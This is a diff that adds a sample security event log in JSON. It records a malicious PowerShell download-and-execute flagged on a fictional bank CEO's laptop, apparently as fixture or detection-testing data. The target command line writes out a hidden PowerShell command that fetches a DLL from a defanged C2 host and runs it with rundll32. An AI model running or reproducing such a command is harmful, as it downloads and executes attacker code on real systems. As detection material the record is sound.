@@ -1,0 +1,49 @@
+{
+  "metadata": {
+    "event_timestamp": "2025-12-06T09:05:10Z",
+    "event_type": "PROCESS_CREATION",
+    "product_name": "Google SecOps Agent",
+    "vendor_name": "Google",
+    "description": "CMD process launched PowerShell to execute a malicious download command from a C2 domain (Stage 2 execution)."
+  },
+  "principal": {
+    "user": {
+      "userid": "user-sid-12345",
+      "email_address": "richard.sterling@grandbank.corp",
+      "username": "richard.sterling",
+      "domain": "GRANDBANK"
+    },
+    "process": {
+      "file": {
+        "full_path": "C:\\Windows\\System32\\cmd.exe",
+        "file_name": "cmd.exe",
+        "md5": "3b4f8c21edab51ff72d2655fdde53312"
+      },
+      "process_id": "6540",
+      "command_line": "\"C:\\Windows\\System32\\cmd.exe\" /c powershell -nop -w hidden -c \"Invoke-WebRequest ... (truncated for clarity)\"",
+      "creation_time": "2025-12-06T09:05:09Z"
+    }
+  },
+  "target": {
+    "process": {
+      "file": {
+        "full_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "file_name": "powershell.exe"
+      },
+      "process_id": "8120",
+      "command_line": "powershell -nop -w hidden -c \"Invoke-WebRequest 'hxxps://malicious-update-storage.eastus.cloudapp[.]azure.com' -OutFile 'C:\\Users\\ceo\\AppData\\Local\\Temp\\updcore.dll'; Start-Sleep -Seconds 5; rundll32.exe 'C:\\Users\\ceo\\AppData\\Local\\Temp\\updcore.dll',EntryPoint\"",
+      "creation_time": "2025-12-06T09:05:10Z"
+    }
+  },
+  "observer": {
+    "hostname": "ceo-laptop01.grandbank.corp",
+    "vendor_name": "Google"
+  },
+  "security_result": [
+    {
+      "category": "SOFTWARE_MALICIOUS",
+      "severity": "HIGH",
+      "threat_name": "Suspicious_PowerShell_Execution_C2"
+    }
+  ]
+}
